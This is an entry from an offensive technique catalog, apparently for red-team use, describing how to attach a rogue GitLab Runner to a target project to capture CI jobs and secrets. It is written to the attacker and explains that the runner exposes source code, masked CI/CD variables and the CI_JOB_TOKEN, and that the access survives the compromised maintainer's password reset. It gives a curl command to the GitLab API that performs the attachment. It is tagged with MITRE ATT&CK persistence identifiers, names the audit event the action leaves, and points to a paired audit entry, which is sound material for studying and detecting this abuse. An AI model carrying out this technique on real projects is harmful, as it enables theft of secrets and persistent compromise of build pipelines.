---
id: gl-runner-hijack
title: Attach a rogue GitLab Runner (capture CI jobs + secrets)
section: GitLab / CI/CD
phase: Persistence
attack:
  tactic: TA0003
  techniques: [T1543]
platform: [gitlab]
source: GitLab CI/CD abuse (rogue runner association)
pair: gl-runner-audit
---

With Maintainer/Owner (or a token carrying it), enable an attacker-controlled runner
on the target project. Every CI job that lands on it executes on your host — you read
the checked-out source, the job's masked **CI/CD variables**, and the `CI_JOB_TOKEN`
that can reach the registry and API. Durable, non-interactive, and survives the
compromised maintainer's password reset. Associating the runner writes a
`set_runner_associated_projects` audit event. (Cloud CI — no on-host target, so no slots.)

```sh
# stand up your own runner (gitlab-runner register), then enable it on the target project
curl --request POST --header "PRIVATE-TOKEN: <token>" \
  "https://<gitlab>/api/v4/projects/<project_id>/runners" --form "runner_id=<rogue_runner_id>"
```
